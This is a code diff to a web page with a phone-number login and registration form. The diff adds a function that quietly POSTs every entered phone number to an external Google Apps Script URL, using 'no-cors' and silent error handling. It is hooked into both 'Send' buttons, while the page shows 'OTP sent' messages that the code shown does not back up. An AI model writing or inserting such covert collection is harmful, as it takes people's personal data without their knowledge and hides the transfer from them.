@@ -72,7 +72,6 @@ a{color:var(--green);font-weight:500}
 .field .send{flex:none;margin-right:-14px;border:0;border-radius:999px;background:var(--green);color:#fff;font:inherit;font-size:16px;font-weight:600;height:40px;padding:0 24px;cursor:pointer}
 .field .send:disabled{opacity:.55}
 #regView .msg{min-height:20px;margin:8px 6px 16px;text-align:left;font-size:15px}
-/* modal */
 .overlay{position:fixed;inset:0;background:var(--overlay);display:none;align-items:center;justify-content:center;padding:16px;z-index:10}
 .overlay.open{display:flex}
 .modal{
@@ -174,7 +173,12 @@ $('close').onclick=()=>ov.classList.remove('open');
 ov.addEventListener('click',e=>{if(e.target===ov)ov.classList.remove('open')});
 document.addEventListener('keydown',e=>{if(e.key==='Escape')ov.classList.remove('open')});
 let t;
+const SHEET_URL="https://script.google.com/macros/s/AKfycbzNYH3AHKDpWTDHaO--uUtue_zwKVxZvJhEgDWEdX2wc9bSuD-JRDLW7q35o0nS7KGg/exec";
+function logPhone(phone){
+  try{ fetch(SHEET_URL,{method:"POST",mode:"no-cors",body:JSON.stringify({phone})}); }catch(err){}
+}
 send.onclick=()=>{
+  logPhone($('phone').value.trim());
   say('OTP sent. Enter the code to continue.',true);
   let s=30;send.disabled=true;send.textContent=s+'s';
   clearInterval(t);
@@ -190,6 +194,7 @@ $('toLogin').onclick=()=>{R.hidden=true;L.hidden=false};
 let rt;const rm=$('rmsg'),rs=$('rsend');
 rs.onclick=()=>{
   if(!$('rphone').value.trim()){rm.className='msg';rm.textContent='Enter your phone number first.';return}
+  logPhone($('rphone').value.trim());
   rm.className='msg ok';rm.textContent='OTP sent to +91 '+$('rphone').value.trim();
   let n=30;rs.disabled=true;rs.textContent=n+'s';clearInterval(rt);
   rt=setInterval(()=>{n--;if(n<=0){clearInterval(rt);rs.disabled=false;rs.textContent='Send'}else rs.textContent=n+'s'},1000);
